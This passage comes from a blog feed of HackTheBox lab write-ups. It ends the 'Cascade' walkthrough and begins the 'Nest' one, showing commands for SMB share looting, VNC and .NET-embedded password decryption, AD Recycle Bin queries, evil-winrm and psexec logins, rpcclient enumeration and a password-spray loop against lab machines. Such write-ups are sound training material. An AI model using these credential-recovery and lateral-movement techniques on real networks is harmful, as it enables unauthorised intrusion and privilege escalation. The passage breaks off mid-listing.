+<p>In Data shares, <code>r.thompson</code> is only allowed to read IT folder. I&rsquo;ll pull all the files from the IT folder using <code>smbget</code>.</p>
+<blockquote>
+<p>Recall enumeration via RPC, <code>r.thompson</code> is a member of the IT group.</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «cascade» «192.168.43.234»
+$ smbget -R smb://cascade.htb/Data/IT/ -U r.thompson
+</code></pre></div><p><img src="imgs/image-20210423205837847.png" alt="image-20210423205837847" style="zoom:80%;" /></p>
+<p>Here is the directory structure. I&rsquo;ll take a look on <code>Meeting_Notes_June_2018.html</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
+$ tree
+.
+└── IT
+    ├── Email Archives
+    │   └── Meeting_Notes_June_2018.html
+    ├── LogonAudit
+    ├── Logs
+    │   ├── Ark AD Recycle Bin
+    │   │   └── ArkAdRecycleBin.log
+    │   └── DCs
+    │       └── dcdiag.log
+    └── Temp
+        ├── r.thompson
+        └── s.smith
+            └── VNC Install.reg
+
+<span style="color:#ae81ff">9</span> directories, <span style="color:#ae81ff">4</span> files
+</code></pre></div><p>I can read the <code>Meeting_Notes_June_2018.html</code>&rsquo;s content using browser. I drew a red line to indicate something important.</p>
+<p><div class="img-container"><img src="imgs/image-20210423210730678.png" alt="image-20210423210730678"  /></div>
+</p>
+<p>The second interesting file is <code>VNC Install.reg</code>. It contains a stored password which can be decrypted according to this GitHub (<a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a>)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">□□Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+...&lt;snip&gt;...
+&#34;Password&#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f
+...&lt;snip&gt;...
+</code></pre></div><p>The third interesting file is <code>ArkAdRecycleBin.log</code>. It looks like a log from a custom application. I&rsquo;ll take note on &ldquo;Moving object to AD recycle bin CN=TempAdmin&rdquo; part.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
+1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
+1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
+2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
+2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
+2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
+2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
+8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
+8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
+8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
+</code></pre></div><p>As for <code>dcdiag.log</code>, up until now, I had no idea what that log was about.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-ssmith">Shell as s.smith</h3>
+<h4 id="decrypt-vnc-password">Decrypt VNC Password</h4>
+<p>The VNC password can be decrypted using metasploit irb (interactive ruby).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#f92672">&gt;&gt;</span> fixedkey <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17\x52\x6b\x06\x23\x4e\x58\x07</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17</span><span style="color:#e6db74">Rk</span><span style="color:#ae81ff">\x06</span><span style="color:#e6db74">#NX</span><span style="color:#ae81ff">\a</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#39;rex/proto/rfb&#39;</span>
+<span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>
+<span style="color:#f92672">&gt;&gt;</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Proto</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RFB</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Cipher</span><span style="color:#f92672">.</span>decrypt <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;6BCF2A4B6E5ACA0f&#34;</span><span style="color:#f92672">].</span>pack(<span style="color:#e6db74">&#39;H*&#39;</span>), fixedkey
+<span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;sT333ve2&#34;</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423213121911.png" alt="image-20210423213121911"  /></div>
+</p>
+<p>Since it was discovered in <code>s.smith</code>&rsquo;s folder, I may try this decrypted password on user <code>s.smith</code>.</p>
+<h4 id="remote-access">Remote Access</h4>
+<p>From RPC enumeration, I already knew that user <code>s.smith</code> is a member of Remote Management Users, so I could try it with <code>evil-winrm</code> and it works.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
+$ evil-winrm -i cascade.htb -u s.smith -p <span style="color:#e6db74">&#39;sT333ve2&#39;</span>
+</code></pre></div><p>I can grab user flag.</p>
+<p><img src="imgs/image-20210423213702788.png" alt="image-20210423213702788" style="zoom:80%;" /></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-arksvc">Shell as arksvc</h3>
+<h4 id="audit-share">Audit$ share</h4>
+<p>After enumerating <code>s.smith</code>&rsquo;s privileges and groups, <code>CASCADE\Audit Share</code> reminds me to the <code>Audit$</code> share, to which I previously had no access.</p>
+<p><div class="img-container"><img src="imgs/image-20210423214229455.png" alt="image-20210423214229455"  /></div>
+</p>
+<p>I have read permissions now on <code>Audit$</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210423214742159.png" alt="image-20210423214742159"  /></div>
+</p>
+<p>This share appears to contain an entire software application.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
+$ smbclient -U s.smith <span style="color:#ae81ff">\\\\</span>cascade.htb<span style="color:#ae81ff">\\</span>Audit$
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423214817145.png" alt="image-20210423214817145"  /></div>
+</p>
+<p>I&rsquo;ll pull them all from Cascade to my Kali</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
+$ smbget -R smb://cascade.htb/Audit$ -U s.smith
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423215007263.png" alt="image-20210423215007263"  /></div>
+</p>
+<p>And then send them over to my Windows.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Audit$» «192.168.43.234»
+$ tree
+.
+├── CascAudit.exe
+├── CascCrypto.dll
+├── DB
+│   └── Audit.db
+├── RunAudit.bat
+├── System.Data.SQLite.dll
+├── System.Data.SQLite.EF6.dll
+├── x64
+│   └── SQLite.Interop.dll
+└── x86
+    └── SQLite.Interop.dll
+
+<span style="color:#ae81ff">3</span> directories, <span style="color:#ae81ff">8</span> files
+
+→ root@iamf «Audit$» «192.168.43.234»
+$ file CascAudit.exe
+CascAudit.exe: PE32 executable <span style="color:#f92672">(</span>console<span style="color:#f92672">)</span> Intel <span style="color:#ae81ff">80386</span> Mono/.Net assembly, <span style="color:#66d9ef">for</span> MS Windows
+</code></pre></div><h4 id="analyzing-auditdb">Analyzing Audit.db</h4>
+<p><code>Audit.db</code> is an SQlite3 database. As I&rsquo;m analyzing on my Windows without SQLite installed, I&rsquo;ll use an online <a href="https://inloop.github.io/sqlite-viewer/">SQLite viewer</a>.</p>
+<p>There are four tables in the database.</p>
+<p><img src="imgs/image-20210423222130834.png" alt="image-20210423222130834" style="zoom:80%;" /></p>
+<p>The records of the deleted AD object are kept in the <code>DeletedUserAudit</code> table.</p>
+<p><img src="imgs/image-20210423221127995.png" alt="image-20210423221127995" style="zoom:80%;" /></p>
+<p>The <code>Ldap</code> table contains the credentials for ArkSvc.</p>
+<p><img src="imgs/image-20210423222309586.png" alt="image-20210423222309586" style="zoom:80%;" /></p>
+<p>The password is not a simple base64 encoded string, but it is encrypted.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Audit$» «192.168.43.234»
+$ echo <span style="color:#e6db74">&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#39;</span> | base64 -d
+♣♥□□□□□□D□|zC□♠;<span style="color:#75715e">#</span>
+</code></pre></div><h4 id="analyzing-cascauditexe">Analyzing CascAudit.exe</h4>
+<p>I tried to run the program on my PC, but it produced the following errors.</p>
+<p><div class="img-container"><img src="imgs/image-20210423223821767.png" alt="image-20210423223821767"  /></div>
+</p>
+<blockquote>
+<p>Don&rsquo;t run an untrusted binary you downloaded from a CTF box.</p>
+</blockquote>
+<p>I use a tool called <code>dnSpy</code> to reverse CascAudit.exe.</p>
+<p>Once it is loaded, I&rsquo;ll go straight to the main function.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main()
+{
+	<span style="color:#66d9ef">if</span> (MyProject.Application.CommandLineArgs.Count != <span style="color:#ae81ff">1</span>)
+	{
+		Console.WriteLine(<span style="color:#e6db74">&#34;Invalid number of command line args specified. Must specify database path only&#34;</span>);
+		<span style="color:#66d9ef">return</span>;
+	}
+    
+...&lt;snip&gt;...
+<span style="color:#66d9ef">try</span>
+			{
+				sqliteConnection.Open();
+				<span style="color:#66d9ef">using</span> (SQLiteCommand sqliteCommand = <span style="color:#66d9ef">new</span> SQLiteCommand(<span style="color:#e6db74">&#34;SELECT * FROM LDAP&#34;</span>, sqliteConnection))
+				{
+					<span style="color:#66d9ef">using</span> (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
+					{
+						sqliteDataReader.Read();
+						str = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Uname&#34;</span>]);
+						str2 = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Domain&#34;</span>]);
+						<span style="color:#66d9ef">string</span> encryptedString = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Pwd&#34;</span>]);
+						<span style="color:#66d9ef">try</span>
+						{
+							password = Crypto.DecryptString(encryptedString, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span>);
+						}
+						<span style="color:#66d9ef">catch</span> (Exception ex)
+						{
+							Console.WriteLine(<span style="color:#e6db74">&#34;Error decrypting password: &#34;</span> + ex.Message);
+							<span style="color:#66d9ef">return</span>;
+						}
+					}
+				}
+				sqliteConnection.Close();
+			}
+...&lt;snip&gt;...
+</code></pre></div><p>Let&rsquo;s break it down.</p>
+<p>In order for the program to run properly, I need to specify the database path as its first argument.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">...&lt;snip&gt;...
+<span style="color:#66d9ef">if</span> (MyProject.Application.CommandLineArgs.Count != <span style="color:#ae81ff">1</span>)
+	{
+		Console.WriteLine(<span style="color:#e6db74">&#34;Invalid number of command line args specified. Must specify database path only&#34;</span>);
+		<span style="color:#66d9ef">return</span>;
+	}
+...&lt;snip&gt;...
+</code></pre></div><p>If the condition above is satisfied, it opens an SQL connection and fetches all data from the <code>Ldap</code> table. Each of them is then stored to <code>str</code>, <code>str2</code>, and <code>password</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">...&lt;snip&gt;...
+				sqliteConnection.Open();
+				<span style="color:#66d9ef">using</span> (SQLiteCommand sqliteCommand = <span style="color:#66d9ef">new</span> SQLiteCommand(<span style="color:#e6db74">&#34;SELECT * FROM LDAP&#34;</span>, sqliteConnection))
+				{
+					<span style="color:#66d9ef">using</span> (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
+					{
+						sqliteDataReader.Read();
+						str = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Uname&#34;</span>]);
+						str2 = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Domain&#34;</span>]);
+						<span style="color:#66d9ef">string</span> encryptedString = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Pwd&#34;</span>]);
+						<span style="color:#66d9ef">try</span>
+						{
+							password = Crypto.DecryptString(encryptedString, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span>);
+						}
+...&lt;snip&gt;...
+</code></pre></div><p>The interesting part in the code above is, of course, the password decrypt line. Now because I only need the decrypt function, I could remove all the codes and put only this line below on the main function and then print it out using <code>Console.Write()</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">password = Crypto.DecryptString(encryptedString, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span>);
+</code></pre></div><h4 id="decrypt-password">Decrypt Password</h4>
+<p>First, I&rsquo;ll enter edit mode on the current main function</p>
+<p><div class="img-container"><img src="imgs/image-20210423235935774.png" alt="image-20210423235935774"  /></div>
+</p>
+<p>Then, I could only use the decrypt function in the main function. So the main function code now looks like this.</p>
+<p><div class="img-container"><img src="imgs/image-20210424000216346.png" alt="image-20210424000216346"  /></div>
+</p>
+<p>I&rsquo;ll save it as a new program called <code>CascAuditModified.exe</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210424000500081.png" alt="image-20210424000500081"  /></div>
+</p>
+<p>Now if I run it, I get the decrypted password.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌─「iamf@MSI」 ‣ 「/mnt/z/Shared/Audit$」 ᓚᘏᗢ <span style="color:#f92672">[</span>172.17.146.164<span style="color:#f92672">]</span>
+└─╼$ ./CascAuditModified.exe
+w3lc0meFr31nd
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210424000707924.png" alt="image-20210424000707924"  /></div>
+</p>
+<h4 id="remote-access---arksvc">Remote Access - Arksvc</h4>
+<p>From my RPC enumeration, ArkSvc is a member of Remote Management Users, so I can use it with <code>evil-winrm</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
+$ evil-winrm -i cascade.htb -u arksvc -p <span style="color:#e6db74">&#39;w3lc0meFr31nd&#39;</span>
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>rksvc<span style="color:#ae81ff">\D</span>ocuments&gt;
+</code></pre></div><h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>I&rsquo;ll wrap it up:</p>
+<p>First, recall from RPC enumeration that user <code>ArkSvc</code> is also a member of AD Recycle Bin. The AD Recycle Bin group gives you permission to read deleted AD objects.</p>
+<p>Second, according to the email sent by Steve Smith, there is a temporary admin account called <code>TempAdmin</code> that uses the same password as the &ldquo;normal&rdquo; admin account.</p>
+<p><div class="img-container"><img src="imgs/image-20210424003416214.png" alt="image-20210424003416214"  /></div>
+</p>
+<p>But, based on <code>ArkAdRecycleBin.log</code>, <code>TempAdmin</code> has been moved into AD Recycle Bin.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;snip&gt;...
+8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
+8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
+</code></pre></div><p>And now using <code>ArksSvc</code> account, I can search all the deleted objects using the command below:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter <span style="color:#e6db74">&#39;isDeleted -eq $true&#39;</span> -includeDeletedObjects -Properties * -includeDeletedObjects -SearchBase <span style="color:#e6db74">&#34;DC=cascade,DC=local&#34;</span>
+</code></pre></div><p>After looking through the output, I noticed that <code>TempAdmin</code> has one interesting properties. It is another <code>cascadeLegacyPwd</code>.</p>
+<p><img src="imgs/image-20210424004624882.png" alt="image-20210424004624882" style="zoom:80%;" /></p>
+<p>I can decode the value to plaintext</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
+$ echo <span style="color:#e6db74">&#39;YmFDVDNyMWFOMDBkbGVz&#39;</span> | base64 -d
+baCT3r1aN00dles
+</code></pre></div><p><code>TempAdmin:baCT3r1aN00dles</code></p>
+<h4 id="remote-access---nt-authoritysystem">Remote Access - NT Authority\System</h4>
+<p>The password works on the Administrator account, and I can obtain an interactive shell as NT Authority\System using <code>psexec.py</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
+$ psexec.py cascade.local/administrator:<span style="color:#e6db74">&#39;baCT3r1aN00dles&#39;</span>@cascade.htb
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210424005142127.png" alt="image-20210424005142127"  /></div>
+</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin">https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Nest</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-nest/</link>
+      <pubDate>Fri, 16 Apr 2021 04:59:14 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-nest/</guid>
+      <description>Nest is one of my favorite machines after Forest, I learn a lot about enumeration here, especially for SMB.
+Nest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to c.smith. There is also a VB project inside a directory that can not be reached unless you visit its full path.</description>
+      <content:encoded><![CDATA[<p>Nest is one of my favorite machines after Forest, I learn a lot about enumeration here, especially for SMB.</p>
+<p>Nest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to <code>c.smith</code>. There is also a VB project inside a directory that can not be reached unless you visit its full path. There is a decrypt function on the project that can be used to decrypt <code>c.smith</code>&rsquo;s password. Enumerating <code>c.smith</code> home directory discovers a password for enabling debug mode of a custom application. Debug mode in the application unlocks new options, which can then be used to read the application&rsquo;s configuration and obtain encrypted Administrator password. By reversing the application, I&rsquo;m able to decrypted the administrator password, and then use it gain administrator access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>SMB enumeration</li>
+<li>Alternate Data Stream</li>
+<li>Reversing .NET</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>smbclient - Preinstalled in Kali Linux</li>
+<li>smbget - Preinstalled in Kali Linux</li>
+<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nest» «192.168.43.234»
+$ nmap -p1-5000 -sC -sV -oA nmap/nest 10.10.10.178
+Nmap scan report <span style="color:#66d9ef">for</span> htb.nest <span style="color:#f92672">(</span>10.10.10.178<span style="color:#f92672">)</span>
+PORT    STATE SERVICE       VERSION
+445/tcp open  microsoft-ds?
+4386/tcp open  unknown                                                                                       
+| fingerprint-strings:                                                                                       
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+|     Reporting Service V1.2                                                                                 
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+|     Reporting Service V1.2
+|     Unrecognised command
+|   Help:          
+|     Reporting Service V1.2
+|     This service allows users to run queries against databases using the legacy HQK format
+|     AVAILABLE COMMANDS ---                  
+|     LIST   
+|     SETDIR &lt;Directory_Name&gt;
+|     RUNQUERY &lt;Query_ID&gt;          
+|     DEBUG &lt;Password&gt;
+|_    HELP &lt;Command&gt; 
+
+Host script results:
+|_clock-skew: -27s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-04-28T15:16:46
+|_  start_date: 2020-04-28T04:20:37
+</code></pre></div><p><code>nmap</code> shows two ports open: SMB on port 445, and an unknown service on port 4386, but the fingerprints show it as &lsquo;Reporting Service V1.2&rsquo;.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
+<p>Anonymous access is allowed here.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nest» «192.168.43.234»
+$ smbclient -N -L //10.10.10.178/
+</code></pre></div><p><img src="imgs/image-20210416095936362.png" alt="image-20210416095936362" style="zoom:80%;" /></p>
+<h4 id="data-share">Data share</h4>
+<p>Enumeration on <code>Data</code> share with recurse mode shows two text files.</p>
+<p><img src="imgs/image-20210416095856849.png" alt="image-20210416095856849" style="zoom:80%;" /></p>
+<p>One of them is empty while the other one contains credentials for <code>TempUser:Welcome2019</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «smb» «192.168.43.234»
+$ cat loot/Welcome<span style="color:#ae81ff">\ </span>Email.txt
+We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;
+
+You will find your home folder in the following location:
+<span style="color:#ae81ff">\\</span>HTB-NEST<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\&lt;</span>USERNAME&gt;
+
+If you have any issues accessing specific services or workstations, please inform the
+IT department and use the credentials below <span style="color:#66d9ef">until</span> all systems have been set up <span style="color:#66d9ef">for</span> you.
+
+Username: TempUser
+Password: welcome2019
+
+
+Thank you
+HR
+</code></pre></div><p>With <code>TempUsers</code>, I could access the <code>Secure$</code> share.</p>
+<blockquote>
+<p>Sorry if you annoyed by the red box, me too.</p>
+</blockquote>
+<p><img src="imgs/image-20210416100016140.png" alt="image-20210416100016140" style="zoom:80%;" /></p>
+<p>Unfortunately, once I got to <code>Secure$</code> share, I couldn&rsquo;t list any single directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «smb» «192.168.43.234»
+$  smbclient -U <span style="color:#e6db74">&#39;TempUser%welcome2019&#39;</span> //10.10.10.178/Secure$ 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> recurse on
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\F</span>inance<span style="color:#ae81ff">\*</span>
+NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\H</span>R<span style="color:#ae81ff">\*</span>
+NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\*</span>
+</code></pre></div><p>On the other hand, I do user enumeration with <code>rpcclient</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210416100040356.png" alt="image-20210416100040356"  /></div>
+</p>
+<p>With a little knowledge of scripting, I can filter the user.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nest» «192.168.43.234»
+$  rpcclient -U <span style="color:#e6db74">&#39;TempUser%welcome2019&#39;</span> -c <span style="color:#e6db74">&#39;enumdomusers;quit&#39;</span> 10.10.10.178 | tr -d <span style="color:#e6db74">&#39;[]&#39;</span> | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f2 | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f1
+Administrator
+C.Smith
+Guest
+Service_HQK
+TempUser
+</code></pre></div><p>I did a password spray using a simple bash script with a pattern of <code>username:username</code>, but no luck</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> u in <span style="color:#e6db74">`</span>cat rpcusers.txt<span style="color:#e6db74">`</span>; <span style="color:#66d9ef">do</span> 
+ echo -n “<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> user : $u “ <span style="color:#f92672">&amp;&amp;</span> 
+ rpcclient -U “$u%$u” -c “getusername;quit” 10.10.10.178
+<span style="color:#66d9ef">done</span>
+</code></pre></div><p>I also check on users' information to find a plain password in the description, but end up knowing the user flag is on <code>c.smith</code>.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*7NAs7fNGkLwtNwZsGjTkRw.png" alt="img"  /></div>
+</p>
+<p>I went back to SMB, I decided to download all the content in the <code>Data</code> share.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «192.168.43.234»
+$ smbget -R smb://10.10.10.178/Data/ -U TempUser  <span style="color:#75715e"># or use mget * inside smbclient</span>
+</code></pre></div><p>Here is the folder structure on <code>Data</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
+$ tree
+.
+├── IT
+│   ├── Archive
+│   ├── Configs
+│   │   ├── Adobe
+│   │   │   ├── editing.xml
+│   │   │   ├── Options.txt
+│   │   │   ├── projects.xml
+│   │   │   └── settings.xml
+│   │   ├── Atlas
+│   │   │   └── Temp.XML
+│   │   ├── DLink
+│   │   ├── Microsoft
+│   │   │   └── Options.xml
